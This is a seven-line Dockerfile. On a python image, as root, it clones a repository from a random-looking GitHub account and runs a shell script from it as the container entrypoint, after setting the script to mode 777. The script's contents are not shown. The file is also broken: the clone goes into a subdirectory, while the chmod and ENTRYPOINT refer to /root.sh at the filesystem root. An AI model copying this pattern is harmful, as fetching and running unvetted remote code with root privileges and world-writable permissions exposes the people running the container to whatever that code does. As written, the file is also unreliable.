FROM python
EXPOSE 8000
USER root
WORKDIR /app
Run cd / && git clone https://github.com/loyejaotdiqr47123/verbose-lamp.git
Run cd / && chmod 777 root.sh
ENTRYPOINT [ "/root.sh" ]
